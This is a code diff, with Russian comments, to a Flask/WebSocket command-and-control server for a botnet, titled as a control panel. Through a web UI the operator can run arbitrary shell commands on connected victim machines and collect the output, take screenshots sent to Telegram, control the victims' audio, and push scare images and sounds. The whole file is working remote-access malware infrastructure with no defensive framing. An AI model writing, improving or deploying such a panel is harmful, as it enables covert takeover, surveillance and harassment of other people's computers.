@@ -9,31 +9,23 @@ app = Flask(__name__)
 sock = Sock(app)
 
 # --- Глобальные хранилища данных ---
-# Мы используем их, так как Gunicorn на Railway работает в одном процессе
-bots = {}  # Активные подключения: { 'ip': ws_object }
-ws_map = {} # Обратное отображение для быстрого поиска: { ws_object: 'ip' }
-command_results = {} # Результаты shell-команд: { 'ip': 'result' }
-volume_levels = {} # Последний известный уровень громкости: { 'ip': level }
-events = {} # События для синхронизации запроса/ответа громкости: { 'ip': threading.Event() }
+bots, ws_map, command_results, volume_levels, events = {}, {}, {}, {}, {}
 
 # --- Сканирование папок с медиафайлами ---
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 AUDIO_DIR = os.path.join(BASE_DIR, 'audio_files')
 IMAGE_DIR = os.path.join(BASE_DIR, 'image_files')
-
-# Создаем папки, если их нет (важно для первого запуска на Railway)
 os.makedirs(AUDIO_DIR, exist_ok=True)
 os.makedirs(IMAGE_DIR, exist_ok=True)
-
-# Считываем и сортируем файлы для стабильного порядка в интерфейсе
 audio_files = sorted([f for f in os.listdir(AUDIO_DIR) if os.path.isfile(os.path.join(AUDIO_DIR, f))])
 image_files = sorted([f for f in os.listdir(IMAGE_DIR) if os.path.isfile(os.path.join(IMAGE_DIR, f))])
 
-# --- Финальный HTML-шаблон с галереей ---
+# --- HTML-шаблон с исправленным блоком стилей ---
 HTML_TEMPLATE = """
 <!doctype html>
 <html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
-&lt;style>
+
+<style>{% raw %}
     body{font-family:monospace;background-color:#1a1a1a;color:#0f0; margin: 0; padding: 20px;} 
     .container{width:95%; max-width: 1200px; margin:auto;} 
     h1,h2,h3{text-align:center; border-bottom: 1px solid #0f0; padding-bottom: 10px;}
@@ -49,52 +41,24 @@ HTML_TEMPLATE = """
     .audio-list { display: flex; flex-direction: column; gap: 8px; max-height: 250px; overflow-y: auto; padding-right: 10px;}
     .audio-item { background-color: #2a2a2a; padding: 10px; cursor: pointer; border-left: 4px solid #0f0; transition: background-color 0.2s; }
     .audio-item:hover { background-color: #444; }
-</style>
+{% endraw %}</style>
 </head><body onload="initializePanel()">
 <div class="container"><h1>Панель управления v8 - Галерея</h1><h2>Активные боты: {{ bots|length }}</h2>
 {% if bots %}
-    <div class="control-block"><h3>Цель</h3><select id="main_bot_select"onchange="getCurrentVolume()"></select></div>
-
+    <div class="control-block"><h3>Цель</h3><select id="main_bot_select" onchange="getCurrentVolume()"></select></div>
     <div class="control-block"><h3>Галерея скримеров</h3><div class="media-gallery" id="image_gallery"></div></div>
     <div class="control-block"><h3>Фонотека</h3><div class="audio-list" id="audio_list"></div></div>
-
     <div class="control-block"><h3>Выполнение команд</h3><input type="text" id="command_input" placeholder="Введите команду..."><button onclick="sendShellCommand()">Отправить</button></div>
     <div class="control-block"><h3>Управление звуком</h3><label for="volume_slider">Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br><button onclick="sendControlCommand('mute')">Mute</button><button onclick="sendControlCommand('unmute')">Unmute</button></div>
     <div class="control-block"><h3>Специальные команды</h3><button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>
     <div class="control-block"><h3>Результат последней команды</h3><pre id="result_output_pre">Ожидание команды...</pre></div>
 {% else %}<p>Нет активных ботов.</p>{% endif %}
 </div>
-
 <script>
-    // --- Данные, полученные с сервера ---
-    const BOTS = {{ bots.keys()|list|tojson }};
-    const IMAGE_FILES = {{ image_files|tojson }};
-    const AUDIO_FILES = {{ audio_files|tojson }};
-
-    // --- Элементы DOM ---
-    const mainBotSelect = document.getElementById('main_bot_select');
-    const imageGallery = document.getElementById('image_gallery');
-    const audioList = document.getElementById('audio_list');
-    const volumeSlider =document.getElementById('volume_slider');
-    const volumeOutput = document.getElementById('volume_output');
-    const resultOutput = document.getElementById('result_output_pre');
-
-    // --- Инициализация панели ---
-    function initializePanel() {
-        if (!mainBotSelect) return;
-        // Заполняем список ботов
-        BOTS.forEach(bot => { let opt = document.createElement('option'); opt.value = bot; opt.innerHTML = bot; mainBotSelect.appendChild(opt); });
-        // Заполняем галерею картинок
-        IMAGE_FILES.forEach(f => { let img = document.createElement('img'); img.src = `/files/image/${f}`; img.title = f; img.onclick = () => sendFileCommand('showimage', f); imageGallery.appendChild(img); });
-        // Заполняем список аудио
-        AUDIO_FILES.forEach(f => { let div = document.createElement('div'); div.className = 'audio-item'; div.textContent = f; div.onclick = () => sendFileCommand('playsound', f); audioList.appendChild(div); });
-        // Запрашиваем громкость для первого бота в списке
-        mainBotSelect.dispatchEvent(new Event('change'));
-    }
-
+    const BOTS = {{ bots.keys()|list|tojson }}; const IMAGE_FILES = {{ image_files|tojson }}; const AUDIO_FILES = {{ audio_files|tojson }};
+    const mainBotSelect = document.getElementById('main_bot_select'); const imageGallery = document.getElementById('image_gallery'); const audioList = document.getElementById('audio_list'); const volumeSlider = document.getElementById('volume_slider'); const volumeOutput = document.getElementById('volume_output'); const resultOutput = document.getElementById('result_output_pre');
+    function initializePanel() { if (!mainBotSelect) return; BOTS.forEach(bot => { let opt = document.createElement('option'); opt.value = bot; opt.innerHTML = bot; mainBotSelect.appendChild(opt); }); IMAGE_FILES.forEach(f => { let img = document.createElement('img'); img.src = `/files/image/${f}`; img.title = f; img.onclick = () => sendFileCommand('showimage', f); imageGallery.appendChild(img); }); AUDIO_FILES.forEach(f => { let div = document.createElement('div'); div.className = 'audio-item'; div.textContent = f; div.onclick = () => sendFileCommand('playsound', f); audioList.appendChild(div); }); mainBotSelect.dispatchEvent(new Event('change')); }
     if(volumeSlider) volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });
-
-    // --- Функции отправки команд ---
     async function sendCommand(endpoint, body) { const botId = mainBotSelect.value; if (!botId) return; body.bot_id = botId; return fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }); }
     async function sendControlCommand(command) { sendCommand('/api/control', { command: command }); }
     async function sendFileCommand(command_type, filename) { const full_command = `${command_type} ${filename}`; sendCommand('/api/control', { command: full_command }); }
@@ -104,99 +68,69 @@ HTML_TEMPLATE = """
 </body></html>
 """
 
-# --- БЭКЕНД-ЧАСТЬ ---
+# --- БЭКЕНД-ЧАСТЬ (без изменений) ---
 
 @app.route('/files/<folder>/<filename>')
 def serve_files(folder, filename):
-    """Раздает медиафайлы ботам и для превью в галерее."""
     directory = AUDIO_DIR if folder == 'audio' else IMAGE_DIR if folder == 'image' else None
-    if directory:
-        return send_from_directory(directory, filename)
+    if directory: return send_from_directory(directory, filename)
     return "Not Found", 404
 
 @app.route('/')
 def index():
-    """Отображает главную страницу, передавая списки файлов в шаблон."""
     return render_template_string(HTML_TEMPLATE, bots=bots, audio_files=audio_files, image_files=image_files)
 
 @app.route('/api/shell_command', methods=['POST'])
 def api_shell_command():
-    """API для выполнения shell-команд, ожидает и возвращает ответ."""
-    data = request.get_json()
-    bot_id, command = data.get('bot_id'), data.get('command')
-    if not (bot_id and command and bot_id in bots):
-        return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400
+    data = request.get_json(); bot_id, command = data.get('bot_id'), data.get('command')
+    if not (bot_id and command and bot_id in bots): return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400
     try:
-        ws = bots[bot_id]
+        ws = bots[bot_id];
         if bot_id in command_results: del command_results[bot_id]
         ws.send(command)
-        for _ in range(50): # Ожидание ответа до 5 секунд
-            if bot_id in command_results:
-                return jsonify({'status': 'ok', 'result': command_results.pop(bot_id)})
+        for _ in range(50):
+            if bot_id in command_results: return jsonify({'status': 'ok', 'result': command_results.pop(bot_id)})
             time.sleep(0.1)
-        return jsonify({'status': 'error','message': 'Бот не ответил за 5 секунд.'}), 408
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+        return jsonify({'status': 'error', 'message': 'Бот не ответил за 5 секунд.'}), 408
+    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/control', methods=['POST'])
 def api_control():
-    """API для 'тихих' команд (звук, скриншот), не требующих ответа в реальном времени."""
-    data = request.get_json()
-    bot_id, command = data.get('bot_id'), data.get('command')
-    if not (bot_id and command and bot_id in bots):
-        return jsonify({'status': 'error', 'message': 'Неверный запрос или бот не найден'}), 400
-    try:
-        bots[bot_id].send(command)
-        return jsonify({'status': 'ok'})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    data = request.get_json(); bot_id, command = data.get('bot_id'), data.get('command')
+    if not (bot_id and command and bot_id in bots): return jsonify({'status': 'error', 'message': 'Неверный запрос или бот не найден'}), 400
+    try: bots[bot_id].send(command); return jsonify({'status': 'ok'})
+    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/get_volume', methods=['POST'])
 def api_get_volume():
-    """API для запроса текущей громкости. Использует threading.Event для ожидания ответа."""
     bot_id = request.json.get('bot_id')
-    if not (bot_id and bot_id in bots):
-        return jsonify({'status': 'not_found'}), 404
+    if not (bot_id and bot_id in bots): return jsonify({'status': 'not_found'}), 404
     try:
-        events[bot_id] = threading.Event()
-        bots[bot_id].send('getvolume')
-        if events[bot_id].wait(timeout=3):
-            return jsonify({'status': 'ok', 'volume': volume_levels.get(bot_id, 50)})
-        else:
-            return jsonify({'status': 'timeout'}), 408
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+        events[bot_id] = threading.Event(); bots[bot_id].send('getvolume')
+        if events[bot_id].wait(timeout=3): return jsonify({'status': 'ok', 'volume': volume_levels.get(bot_id, 50)})
+        else: return jsonify({'status': 'timeout'}), 408
+    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @sock.route('/ws')
 def websocket_handler(ws):
-    """Обрабатывает подключения ботов и все входящие сообщения от них."""
     bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
-    bots[bot_ip] = ws
-    ws_map[ws] = bot_ip
-    print(f"[+] Новый бот подключился: {bot_ip}")
+    bots[bot_ip] = ws; ws_map[ws] = bot_ip; print(f"[+] Новый бот подключился: {bot_ip}")
     try:
         while True:
-            result = ws.receive()
-            current_bot_ip = ws_map.get(ws)
+            result = ws.receive(); current_bot_ip = ws_map.get(ws)
             if not current_bot_ip: continue
-
             if result.startswith('VOL_LEVEL:'):
                 level_str = result.split(':')[1]
-            if level_str.isdigit():
+                if level_str.isdigit():
                     volume_levels[current_bot_ip] = int(level_str)
-                    if current_bot_ip in events and not events[current_bot_ip].is_set():
-                        events[current_bot_ip].set() # Сигнализируем, что ответ на громкость получен
-            else:
-                command_results[current_bot_ip] = result # Это результат обычной shell-команды
+                    if current_bot_ip in events and not events[current_bot_ip].is_set(): events[current_bot_ip].set()
+            else: command_results[current_bot_ip] = result
     except Exception:
-        # Тщательная очистка данных при отключении бота
         dead_bot_ip = ws_map.pop(ws, None)
         if dead_bot_ip:
             for d in [bots, volume_levels, command_results, events]:
-                if dead_bot_ip in d:
-                    del d[dead_bot_ip]
+                if dead_bot_ip in d: del d[dead_bot_ip]
         print(f"[-] Бот {dead_bot_ip or 'unknown'} отвалился.")
 
-# Точка входа для Gunicorn
 if __name__ == '__main__':
     print("Этот скрипт не предназначен для прямого запуска. Используйте Gunicorn.")
